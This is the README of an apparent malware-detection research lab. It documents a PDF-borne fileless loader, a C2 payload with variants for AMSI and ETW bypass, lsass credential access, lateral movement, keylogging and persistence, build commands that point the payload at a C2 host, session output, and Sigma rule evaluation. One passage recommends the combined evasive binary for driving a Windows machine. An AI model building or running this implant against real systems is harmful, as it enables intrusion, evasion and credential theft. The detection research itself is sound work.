# PHANTOM-X

**Advanced Fileless Threat Research — Windows 11 Internal Lab**

Research programme mapping the chain
`PDF Document → Reader → Execution Boundary → Memory Activity → Detection → Network Communication`,
with a standing rule: **observed behaviour is distinguished from assumption, and no result is claimed without evidence.**

---

## What works right now

**The attack chain is built and verified end to end.**

```
px_attack_chain.pdf
   └─ embedded PE (FlateDecode)
        └─ px_loader.exe extracts it IN MEMORY — nothing touches disk
             └─ PE mapped by hand: headers, sections, relocations, imports, protections
                  └─ entry point executed on a new thread
                       └─ payload opens a TCP session to the lab C2
                            └─ operator runs commands, gets real output back
```

```
  [PASS] chain established a C2 session through the PDF -- session=1
  [PASS] HELLO parsed -- host=KALI arch=x64 pid=296
  [PASS] latency measured -- 0.31 ms
  [PASS] EXEC 'whoami' returned output -- 'KALI\root'
  [PASS] EXEC 'cmd /c echo PHANTOM_X_CHAIN_PROOF' returned output -- 'PHANTOM_X_CHAIN_PROOF'
  [PASS] controlled session termination -- payload acknowledged EXIT
  RESULT: PASS
```

Reproduce: `python3 phase5_network/test_chain_integration.py`

---

## The technique catalogue

The lab knows about **93 ATT&CK techniques**. That number is the point: it is
the denominator. A lab that reports only its successes is a brochure.

```
  PHANTOM-X :: THE CATALOGUE

    techniques in scope   : 93
    measured              : 65
    ruled but not measured: 6
    not exercised at all  : 22
    of which campaigns    : 4
```

Three statuses, and they are not equally good:

| Status | What it means |
|---|---|
| `measured` | The lab exercises the technique, so the telemetry is real and the rule has been tested against it. |
| `ruled` | A rule exists, but nobody has watched it fire. **A rule that has never fired is a hypothesis.** |
| `not_exercised` | Neither. The lab says nothing about it, and the catalogue says so. |

The four campaigns — ransomware, wiper, cryptojacking, botnet — are listed as
campaigns rather than techniques. A ransomware run is a hundred techniques
executed in an order; no single capability in a single binary is
"ransomware", and pretending otherwise would have made the denominator a lie.

```powershell
# the catalogue as a table
phase7_detection\target\release\px_detect.exe --catalog

# the catalogue as JSON, for the coverage matrix
phase7_detection\target\release\px_detect.exe --emit catalog > catalog.json
```

The rules live in `phase7_detection/src/detections.rs` and
`phase7_detection/src/rules_extra.rs`; the catalogue lives in
`phase7_detection/src/catalog.rs`.

---

## The capability library

Twenty-two techniques are exercised by a single table-driven library, so
that each one can be measured on its own and its telemetry attributed to it.

```
inject    process injection            T1055
token     token theft                  T1134.001
keylog    keylogging                   T1056.001
clip      clipboard                    T1115
persist   Run key / WMI subscription    T1547.001, T1546.003
antifor   self-delete / timestomp / logs T1070.004, T1070.006, T1070.001
recon     sysinfo / processes / users   T1082, T1057, T1087, T1046
lolbin    signed binary proxy          T1218
script    script host abuse            T1059.005, T1059.007
dnstun    data inside DNS              T1572
steg      payload in an image          T1027.003
spoof     rename / PPID / command line T1036.005, T1134.004, T1564.010
delay     sleep / environment check    T1497.003, T1482
antivm    debugger / VM / sandbox      T1497.001, T1622
service   a Windows service            T1543.003
schtask   a scheduled task             T1053.005
com       a hijacked COM class         T1546.015
elev      the auto-elevate key         T1548.002
proxy     the WinINet proxy            T1090
ps        a PowerShell command         T1059.001, T1140
stage     a directory collected into one archive  T1560.001, T1074.001
browser   a credential store opened    T1555.003, T1005
```

**One verb, not one verb per technique.** The server sends
`CAP|<cmd_id>|<technique>|<arguments>` and the payload looks the name up in
the table. A verb per technique would mean changing the protocol every time
something was added, and the two sides would drift apart.

```
  c2> cap 1 list
  <- session 1: the capabilities compiled into this build: inject, token,
     keylog, clip, persist, antifor, recon, lolbin, script, dnstun, steg,
     spoof, delay, antivm, service, schtask, com, elev, proxy, ps, stage,
     browser

  c2> cap 1 recon sysinfo
  <- session 1: host=DESKTOP-TD3A3HK os=6.2.9200 build=9200 arch=9 cpus=24
```

The bounds are the same as the rest of the lab and they are stated in the
source: the injection targets a process the operator names, the port scan
touches one named host, the persistence writes a key or a subscription on
the lab machine with the removal command in the report, and the keylogger
records keys typed into the lab VM. Nothing scans for targets, harvests a
list of credentials to try elsewhere, or reaches off the machine.

Two of the twenty-two deserve an argument rather than a sentence:

- **the techniques that change the machine put it back.** The service, the
  scheduled task, the COM class, the auto-elevate key and the proxy setting
  are all removed again, and the report says how. A lab technique that
  leaves litter is not a lab technique; it is a change that every later run
  has to account for.
- **the browser capability opens the credential store and does not read
  it.** The file open is the telemetry the rule needs; the contents stay
  on the machine. That is the same line the credential arm already drew.

---

## Ground rules

Enforced across every phase, not just stated.

1. **Defender stays on** during measurement. The Defender A/B toggle exists to produce a *documented coverage gap*, and it restores with a 60-second guard task so the VM cannot be left unprotected.
2. **No fabricated results.** Every number came from an actual run. Where a result is pending, it says pending.
3. **Structure ≠ execution.** A `/Launch` action is a request. A `VirtualAlloc` is an allocation. Reports keep these apart.
4. **Bounded scope.** The payload only ever affects its own process. No injection into unrelated processes, no persistence. Credential access and lateral movement exist only as lab-scoped variants with the bounds described below. The capability library follows the same rule: every technique names its target explicitly, and nothing sweeps, scans or propagates.
5. **The baseline stays plain.** The default build has no obfuscation, no AMSI bypass, no ETW unhooking, no encrypted channel and no domain generation -- so it produces the clean baseline telemetry. The evasion techniques exist as separate builds, each measured against that baseline and each paired with a detection. A payload that evades produces no signal to analyse; that is why the SIGNAL arm and the EVASION arm are both needed, and why the finding is about the rule rather than about the payload.
6. **Cross-validate before trusting.** Every analyzer is checked against an independent implementation.
7. **Isolated by default.** The research VM is default-deny on egress and cannot reach the home network. The isolation is set up and verified before any payload is placed on the machine.
8. **Variants are the experiment.** The baseline payload is plain. The variant builds add one capability each -- obfuscated strings, an AMSI bypass, an ETW unhook, an encrypted channel, domain generation, credential access, lateral movement, file transfer, the technique library -- and each has a detection written alongside it. The difference in what the endpoint sees is the finding, and the finding is about the RULE, not about the payload.
9. **A gap is a finding.** The catalogue says which techniques the lab does not exercise and which rules have never been watched to fire. A lab that reports only its successes is a brochure.

---

## The variant matrix

The lab's question is never "does this technique work". It is always
"what changes in what the endpoint sees when this technique is used", and
that can only be answered by running both arms and comparing.

```
baseline   plain payload, everything visible
obfuscate  the sensitive strings are encoded, so they are not in the binary
amsi       AMSI is patched so it reports clean without scanning
etw        ETW is patched so it returns without tracing
encrypt    the C2 channel is encrypted, so the protocol is not on the wire
dga        the C2 address is a generated hostname that changes daily
cred       credential access against the lab VM
lateral    movement to a second lab host
resilient  reconnects with backoff when the network changes under it
xfer       file download and screen capture
caps       the capability library -- twenty-two techniques, one at a time
all        everything except domain generation -- ONE binary, for the operator
full       everything at once -- the worst case a defender has to catch
```

**`px_payload_all.exe` is the one to use if you just want to drive a
Windows machine.** It carries the obfuscated strings, the AMSI bypass, the
ETW unhook, the encrypted channel, the credential access, the lateral
movement, the reconnect, the file transfer, the screen capture and the
whole technique library -- and it still connects to an address you name.

The one thing it leaves out is domain generation, and that is deliberate:
the DGA arm *replaces* the C2 host with a generated name, so it cannot be
pointed at an address at all. That makes `px_payload_full.exe` awkward to
use and `px_payload_all.exe` practical.

**What one binary costs you.** The matrix exists because a single
everything-arm cannot tell you which technique produced which signal. The
`telemetry` is one blob: if a rule fires, you know the defender could catch
*something*, not that this rule catches *this* technique. So use `all` for
the work and the matrix for the measurement.

```powershell
cd phase3_fileless\loader
.\build_variants.ps1 -C2Host 192.168.77.1 -C2Port 9001
```

Every capability is compiled in or out at build time, never switched at
runtime. A capability that is not compiled in cannot be detected, and
"present but disabled" is not the same thing as "not present".

The obfuscated arm is verified at build time: the build scans the
compiled binary for every sensitive literal and reports whether any
survived.

```
baseline : 11/19 needles visible
obfuscate: no needle found -- the arm is clean
```

See `phase7_detection/README.md` for what each variant measures, and
`phase7_detection/src/detections.rs` for the rules that detect them.

---

## The loop: telemetry -> rules -> findings

The variant matrix is only half a lab. The other half is answering the
question the matrix exists to pose:

> **which of my rules still work once the payload is obfuscated, once ETW
> is unhooked, once the channel is encrypted?**

Without that, the lab is a collection of samples with some rules next to
them. With it, the lab is a measurement.

```
  arm built  ->  run on the VM  ->  telemetry collected  ->  rules evaluated
       ^                                                              |
       |                                                              v
       +--------------  which rules survived?  <-----------  the finding
```

```powershell
# on the VM
cd C:\pxvm\phase8_evaluation
.\collect_events.ps1 -Label baseline_arm
```

```bash
# on the host
phase7_detection/target/release/px_detect.exe --emit json > rules.json

python3 phase8_evaluation/coverage.py \
    --rules rules.json \
    --baseline events_baseline_arm.json \
    --variant events_obfuscate_arm.json
```

The output that matters:

```
  RULES THAT FIRED ON THE BASELINE AND ARE SILENT ON THE VARIANT
  (these were riding on something the variant removed)

    px-002  PDF File Opened By An Unusual Loader Process
    px-004  Process Created From PDF With Embedded PE Payload
```

That is the finding, and it is about the RULE rather than about the
payload. A rule that stops working when a string is encoded was never
really detecting the technique -- it was detecting a string.

The rules are structured data, not text, so the Sigma output and the
machine-readable form come from one definition and cannot drift.

A rule can say **two** things at once. A single selection block ORs its
matchers, so it can only ever say "one of these fields matched" -- which is
not enough for a rule like "a remote write *into a process*". The second
block, `selection_and`, is ANDed with the first, and it is what keeps the
rules from being noise generators.

### Two capabilities are bounded on purpose

**Credential access collects, but the secret material does not go on the
wire.** The C2 server is a plain TCP listener; if the operator runs it on
a routable address -- and running a C2 somewhere reachable is the entire
point of a C2 -- then a payload that ships real credential material there
has published those credentials to whoever can reach that address too.
The detection question is answered by the ACCESS (the handle to lsass.exe,
the memory reads), not by the contents, so the redacted report is a
complete measurement.

**Lateral movement moves to ONE explicitly named host, supplied by the
operator.** No scanning, no target list, no propagation. A payload that
moves itself is a worm, and a worm on a lab segment reaches every lab
host the moment the operator forgets to clean up -- at which point the
lab's telemetry stops being repeatable.

---

## Language policy

The lab targets Windows, so the components are chosen for what the platform
actually needs rather than for what is fashionable:

| Component | Language | Why |
|---|---|---|
| `px_payload.exe` | **C** (freestanding) | It is reflectively mapped by hand. A CRT startup needs a TLS index that only the Windows loader assigns, so the payload cannot link one. See the bug list below. |
| `px_loader.exe` | **C** | Same reason: it maps another PE by hand and must not depend on loader state. |
| `px_hollow.exe` | **C** | Same. |
| the variant modules | **C** | `px_amsi.c`, `px_etw.c`, `px_crypt.c`, `px_dga.c`, `px_cred.c`, `px_lateral.c`, `px_obfuscate.c`, `px_capabilities.c`, `px_file.c`. Each is a no-op when its capability is not compiled in, so the baseline binary genuinely does not contain the capability. |
| `px_c2.exe` | **Go** | The operator side. One static binary with no runtime dependency, cross-compiles to Linux for the Kali rig, and speaks the same wire protocol so the C payload is unchanged. |
| `px_pdfscan.exe` | **Rust** | The independent PDF scanner. Reads hostile input, so memory safety is worth having, and it must run on the VM where Python may not be installed. |
| `px_detect.exe` | **Rust** | The detection rule generator. No crates, so it builds offline and there is nothing to audit but the source. |
| Defender / Sysmon tooling | **PowerShell** | These call Windows APIs directly. PowerShell is the supported interface for `Get-MpComputerStatus` and friends. |
| PDF generation, test harnesses | **Python** | Build-time and analysis-time tooling. Runs on the host, never on the target. |

**No crate dependencies anywhere in the Rust components.** The lab VM is
often offline, and a parser that reads hostile input should not depend on
code nobody in the lab has read. The DEFLATE decoder and the SHA-256
implementation are written out in the source for that reason, and the
SHA-256 is checked against the FIPS 180-4 test vectors in its own test
module.

**One rule for the freestanding C: no stack frame may exceed one page.**
The payload links no CRT and the build raises the stack-probe threshold, so
the compiler never emits the `__chkstk` call that would grow the stack
safely. The Windows stack grows one page per fault, and the kernel refuses
to grow it further -- so a frame larger than a page kills the process at the
first call made inside it. Every buffer of 1024 bytes or more therefore
lives in static storage. The rule and its reasoning are written next to the
`__chkstk` stub in `px_payload.c`.

---

## Build everything on Windows

```powershell
cd phase3_fileless\loader
.\build_all.ps1 -C2Host 192.168.77.1 -C2Port 9001
```

Builds the payload, the loader, the hollow tool, the Go C2 server, both
Rust tools, and the carrier PDF, in dependency order. A missing toolchain
is reported as *skipped* with the reason, not as a failure — a lab
machine with only MSVC on it is a normal state.

---

## Network isolation comes first

The payload runs arbitrary commands inside the VM. The isolation is the
control that contains that risk, so it is set up and verified **before**
any payload is placed on the machine.

```
phase0_labnet/     host-only segment, default-deny egress, home-LAN blocks
                   and a verification script that probes the live network
```

See `phase0_labnet/README.md`.

---

## Windows 11 Pro VM preparation

```powershell
cd phase4_defender
.\vm_prepare.ps1 -LabFolder C:\pxvm -LabGateway 192.168.77.1 -C2Port 9001
```

Network lockdown, then the Defender posture *reported but not changed*,
then Mark-of-the-Web, then the Sysmon check.

---

## Detections

```
phase7_detection/  Sigma rules for the chain, generated by px_detect.exe
```

Fifty-four rules and a catalogue of ninety-three techniques. The rules key on
what is observable: a payload that evades produces no signal to analyse,
which would defeat the purpose of a detection study.

See `phase7_detection/README.md`.

---

## Layout

```
phantom-x/
├── docs/
│   ├── phase1_experiment1.md        PDF attack surface — Phase 1 procedure + results
│   └── phase3_phase5_chain.md       the working chain: build, deploy, measure
├── phase0_labnet/                  network isolation -- RUNS FIRST
│   ├── setup_labnet.ps1            HOST: host-only segment + firewall
│   ├── setup_vm_labnet.ps1         VM: default-deny egress, home-LAN blocks
│   ├── verify_labnet.ps1           VM: proves the isolation by probing
│   └── README.md
├── phase1_pdf/
│   ├── pdf_inspector.py             read-only PDF structure & action analyzer
│   ├── rust_scanner/                INDEPENDENT Rust implementation (px_pdfscan)
│   │   ├── src/scanner.rs           PDF lexer
│   │   ├── src/parser.rs            object table, streams, filters, inflate
│   │   ├── src/analysis.rs          actions, JavaScript, embedded files
│   │   ├── src/sha256.rs            dependency-free SHA-256 (FIPS vectors)
│   │   └── src/main.rs              CLI
│   ├── validate_cross_impl.py       cross-validates Rust against Python
│   ├── make_test_pdfs.py            11 controlled test documents
│   ├── make_attack_pdf.py           builds the carrier PDF
│   ├── validate_against_pypdf.py    cross-validation vs. an independent parser
│   ├── samples/                     generated PDFs + manifest.json
│   └── reports/                     JSON reports
├── phase2_memory/
│   └── win_mem_lab.py               VirtualAlloc/Protect/Query/Free,
│                                    ReadProcessMemory, in-memory execution proof
├── phase3_fileless/
│   ├── loader/
│   │   ├── px_loader.c/.exe         PDF extractor + reflective PE mapper
│   │   ├── px_payload.c/.exe        freestanding C2 client
│   │   ├── px_hollow.c/.exe         PDF extractor + remote process mapper
│   │   ├── px_config.h              the variant switches, all OFF by default
│   │   ├── px_strings.def           the sensitive string list (one source)
│   │   ├── px_strings.h             GENERATED -- the encoded table
│   │   ├── px_obfuscate.c           the string decoder
│   │   ├── px_amsi.c                AMSI bypass variant
│   │   ├── px_etw.c                 ETW unhooking variant
│   │   ├── px_crypt.c               the channel cipher
│   │   ├── px_dga.c                 domain generation variant
│   │   ├── px_cred.c                credential access variant
│   │   ├── px_lateral.c             lateral movement variant
│   │   ├── px_capabilities.c        the capability library -- 14 techniques
│   │   ├── px_file.c                file download and screen capture
│   │   ├── px_variant.h             the interface the variants share
│   │   ├── tools/gen_strings.py     the build-time string encoder
│   │   ├── ks_vector.c              the keystream vector generator
│   │   ├── build_lab.sh/.ps1        rebuild everything
│   │   ├── build_all.ps1            build EVERY component on Windows
│   │   └── build_variants.ps1       build the variant matrix
│   ├── native/                      C++ native loader
│   └── dotnet/                      C# reflective loader variant
├── phase4_defender/
│   ├── vm_prepare.ps1               WINDOWS 11 PRO VM PREPARATION (one script)
│   ├── collect_defender.ps1         read-only Defender + event collector
│   ├── lab_ab_toggle.ps1            Defender A/B with guaranteed restore
│   ├── sysmon_config.xml            Sysmon telemetry configuration
│   ├── validate_sysmon_config.py    offline schema validation
│   └── sysmon_v4_90_schema.xsd      official schema manifest
├── phase5_network/
│   ├── c2_server.py                 lab C2 with sessions, latency, JSONL audit
│   ├── c2_server.go                 GO implementation of the same protocol
│   ├── c2_server_test.go            drives the REAL payload against the Go server
│   ├── crypt.go                     the channel cipher, server side
│   ├── crypt_test.go                the keystream vector test
│   ├── variants.go                  the capability report
│   ├── variants_test.go             the variant arm tests
│   ├── caps_test.go                 the capability library tests
│   ├── xfer_test.go                 the file transfer and capture tests
│   ├── dga_dns.py                   the lab DNS helper for the DGA arm
│   ├── validate_c2_equivalence.py   Go C2 server vs the Python reference
│   ├── test_c2_integration.py       payload-level integration test
│   └── test_chain_integration.py    FULL chain integration test
├── phase6_reports/                  structured JSON reports
├── phase7_detection/                DEFENSIVE DELIVERABLE
│   ├── src/detections.rs            the rules, as data (Sigma + JSON from one source)
│   ├── src/rules_extra.rs           the rules for the capability library
│   ├── src/catalog.rs               the technique catalogue
│   ├── src/main.rs                  px_detect CLI
│   └── README.md
├── phase8_evaluation/               THE LOOP: telemetry -> rules -> findings
│   ├── px_eval.py                   the rule evaluator
│   ├── coverage.py                  the coverage matrix and the gap report
│   ├── collect_events.ps1           telemetry collection on the VM
│   ├── make_synthetic_events.py     the evaluator test fixtures
│   └── test_evaluator.py            1022 assertions on the evaluator semantics
```

---

## The complete walk-through

Every step, in the order it has to happen -- the toolchains, the isolation, the build, the run, the telemetry, the evaluation, and the things that will bite you -- is in

    docs/USAGE.md

---

## Findings

The findings are in [`phase8_evaluation/findings/`](phase8_evaluation/findings/).

**001 — the carrier PDF is detected by four vendors.** The carrier was
submitted to VirusTotal and four engines flagged it: Microsoft
(`Trojan:Win32/Wacatac.B!ml`), Kaspersky (`HEUR:Trojan.Win32.Agentb.gen`),
Symantec (`ML.Attribute.HighConfidence`) and Arctic Wolf. The other 59
returned Undetected.

The verdict type is `file-embedded`, and that is the finding: **the PDF
container is clean and the executable inside it is not.** A defender with
only document inspection sees nothing; a defender with an endpoint agent
sees it. That is a measured confirmation of something the rule set could
only hypothesise.

It is also the first result in this project that the lab did not
manufacture -- the rules, the catalogue and the coverage matrix are all
the lab marking its own homework.

---

## Quick start

```bash
# build the chain
cd phase3_fileless/loader && ./build_lab.sh

# prove it works (Linux, under Wine)
python3 phase5_network/test_chain_integration.py

# Phase 1 regression
cd ../../phase1_pdf
python3 make_test_pdfs.py
python3 pdf_inspector.py samples/ --extract-dir ./quarantine --json reports/out.json
python3 validate_against_pypdf.py
```

### On Windows

```powershell
# build every native component (payload, loader, hollow, Go C2, Rust tools, PDF)
cd phase3_fileless\loader
.\build_all.ps1 -C2Host 192.168.77.1 -C2Port 9001

# isolate the VM from the home network -- THIS COMES FIRST
cd ..\..\phase0_labnet
.\setup_labnet.ps1 -Action apply -LabSubnet 192.168.77.0/24 -C2Port 9001

# on the VM
cd ..\..\phase4_defender
.\vm_prepare.ps1 -LabFolder C:\pxvm -LabGateway 192.168.77.1 -C2Port 9001
cd C:\pxvm
.\collect_defender.ps1 -Label before_chain   # prove Defender was ON
.\px_loader.exe .\px_attack_chain.pdf .\loader.log
.\collect_defender.ps1 -Label after_chain
.\lab_ab_toggle.ps1 -Action off               # guarded A/B, auto-restores
```

### Cross-validation

```bash
# the Rust PDF scanner against the Python reference
python3 phase1_pdf/validate_cross_impl.py --rust phase1_pdf/rust_scanner/target/release/px_pdfscan.exe

# the Go C2 server against the Python reference
python3 phase5_network/validate_c2_equivalence.py --go dist/native/px_c2.exe

# the Go C2 server against the REAL payload
cd phase5_network && go test -v -run TestGoC2Integration .
```

---

## Status

| Phase | Status |
|---|---|
| 0 — Network isolation | **Built and verified.** Host-only segment, default-deny egress, live-network verification |
| 1 — PDF attack surface | Experiment 1 complete (Linux side); Rust cross-check scanner built; VM reader run pending |
| 2 — Windows memory research | `win_mem_lab.py` built; VM run pending |
| 3 — Fileless techniques | **Reflective loading working.** Twenty-two techniques measured through the capability library; the catalogue's remaining techniques are marked, not hidden |
| 4 — Defender evaluation | Collector + Sysmon config built and validated; A/B toggle built; VM preparation script built; VM run pending |
| 5 — Network research | **C2 rig working and tested** in both Python and Go, cross-validated against each other and against the real payload |
| 6 — Reporting infrastructure | JSON schema established |
| 7 — Detections | **Fifty-four rules** for the chain and the capability library, with the observation behind each one stated |
| 8 — Evaluation | The loop is closed: 1022 assertions on the evaluator, and the coverage matrix with its gaps |

---

## Bugs caught by cross-checking

Every one of these produced a confident-looking wrong answer and would have
been shipped as a result:

- `qpdf --check` caught off-by-one `/Contents` references in the PDF generator that our own parser accepted happily.
- The `pypdf` harness caught double-counted actions and lost JavaScript records caused by dereferencing before identity resolution.
- The official Sysmon schema manifest caught 30 invalid condition operators and two conflicting rule blocks in the Sysmon configuration.
- A missing loop-variable reset made the reflective loader's section-protection loop **never execute** — the image stayed non-executable and the entry point died with a misleading fault.
- A conventional EXE cannot be reflectively loaded: its CRT startup needs a TLS index only the Windows loader assigns. Rebuilt freestanding rather than faking loader state.
- A buffer-aliasing bug turned the C2 host into the port number (`connecting to 9306:9306`).
- The payload's own `px_vfmt` did not understand `%ld`, so the exit code in every `RESULT` line reached the server as the literal text `%ld`. Nothing complained: the value was a non-empty string, so the server reported `exit_code=%ld` and could not tell a success from a failure. It also ignored zero-padding, so the timestamp in the marker file came out as `202611110940` instead of `2026-11-11 09:40`. Found by writing the Go C2 server and reading what the C payload actually sent.
- The Go C2 server and the Python reference were compared field by field against the same payload binary. Two implementations of one protocol is what makes that kind of bug visible; a single implementation agreeing with itself proves nothing.
- `setup_labnet.ps1` used `Test-Path 'a' -or Test-Path 'b'`, which PowerShell parses as a parameter named `-or`. The VMware host-only check silently never ran, which would have left the VM bridged onto the home LAN while the script reported success. Caught by running the script instead of only parsing it.
- `px_path_next_to_image` used `strchr` where it needed `strrchr`, so it cut the image path at the **first** backslash: `C:\dir\payload.exe` became `C:`. The marker file was still written, but to the root of the drive instead of next to the payload, so an operator looking for it beside the binary never found it. Found by building with MSVC — which had never actually been run against this file — and noticing the file was missing.
- `build_lab.ps1` is the documented MSVC build path and had never been run. The payload used `__builtin_va_list` and GCC-only `__builtin_va_arg`, which MSVC does not have, and defined `memcpy`/`memset`/`memmove`, which MSVC rejects as intrinsics. The MSVC path could not have compiled the file it claimed to build.
- `px_strcpy` was used 250 lines before its definition, with only a forward declaration. GCC accepts that with a warning; MSVC does not accept it at all.
- The formatter's padding calculation was `width - len` with no guard. With no width given that is `0 - len`, which underflows to a huge unsigned number, and the formatter filled the buffer with spaces. The first version of the fix for this had the same class of bug in the numeric branch and reversed the digits as well, turning port 39999 into 99993. Three formatter bugs in total, all caught by the self-test that now guards them.
- The Go C2 server's `Accept()` blocked forever, so `--duration` never fired and the server could not shut itself down. The Python server had no such problem, which is exactly why writing the comparison was worth the effort.
- The Rust scanner did not walk the catalog's `/Names` JavaScript tree, so it missed the script in a document whose only JavaScript was a named entry. Found by the cross-validation harness against the Python reference.
- The Rust scanner counted one action twice when the same action dictionary was reachable from both a name tree and a page's `/AA`. Found by the same harness, which compared counts rather than assuming they matched.
- The string obfuscator only encoded the strings that were already in the table, and the verification showed that `lsass.exe`, `amsi.dll`, `ws2_32.dll`, `HELLO|`, `RESULT|` and `PX_C2_HOST` were all still plainly visible in the compiled variant. A partially obfuscated payload is one where a defender greps for the string that was missed and finds it immediately. Found by scanning the compiled binary for the literals, not by reading the source.
- The C payload's channel key fell back to the literal text `"PX_C2_KEY"` -- the NAME of the environment variable -- instead of the compiled-in default key. The server used the real default, so the two derived different keystreams and the encrypted session died at the first frame.
- The keystream generator did not match between the C and Go implementations. C promotes `unsigned char` to `int` before adding; Go does not promote, so `byte + byte` wraps. The two therefore picked different indices once a sum exceeded 255 -- which is why the first few bytes of the keystream matched and then diverged. Found by pinning the keystream to a vector generated from the C side.
- The payload's decrypt was given the frame BODY instead of the whole frame, so the length check failed on every frame and the session died at the first exchange with a log line that pointed at the cipher rather than at the framing.
- The C2 server's plaintext reader used `ReadString('\n')`, which reads whatever has arrived in one go. The CAPS line and the beginning of the first encrypted frame arrived in the same TCP segment, so the reader swallowed the frame's first bytes and the keystream desynchronised before the first frame was ever decrypted.
- The server sent a PING before the handshake was complete, because `measureLatency` did not wait for the CAPS report. The payload read the plaintext PING as a frame header and the session died.
- The Go server's byte-at-a-time reader broke out of the INNER loop on a read error but not the outer one, so it spun forever and never wrote its `session_close` record. The cross-implementation comparison reported it as a difference between the two servers.
- The obfuscated string table was compiled only into the obfuscated arm, so the other arms' calls to `px_obf_decode` hit a stub that returned nothing -- which is why the encrypted arm had no channel key at all. The table is about what the program can look up at runtime; the obfuscation is about what the compiler puts in the binary. Those are different questions.
- The plain branch of the payload never initialised the strings for the `CAP`, `DL` and `SHOT` verbs, so every capability was silently ignored in every arm that was not obfuscated. The build was clean, the table was right, and the report would have said the techniques were measured. Found by driving a capability and noticing that no answer came back.
- The file transfer died with an access violation on a **64KB stack frame**. The payload is built with the stack probe disabled and links no CRT, so every frame has to fit in one page: the Windows stack grows one page per fault and the kernel refuses to grow it further. The frame was not "too big" -- it was fatal, at the first call made inside it. Every large buffer is now static, and the rule is written down next to the `__chkstk` stub.
- The formatter truncated every `%s` at **1024 characters**, and `send_line` copied every line into a **2KB buffer**. A base64 chunk is about 22KB, so the transfer left the machine short and the server's hash did not match the file that was sent -- with no error anywhere. Three silent corruptions on one path, each of which looked like a hash mismatch rather than a bug.
- The payload sent the capability mask in **decimal** and the server read it as **hex**. The baseline reports 0 and hides the difference; the credit arm reported 32, which the server read as `0x32`. The variant test now compares the reported mask against what the build should have said, so the next one cannot pass unnoticed.
- The Go server's quarantine directory was created only at start-up, so a directory assigned after the server was built was never created and every transferred file was silently dropped. The transfer test now checks that the file is on disk, not just that the bytes arrived.
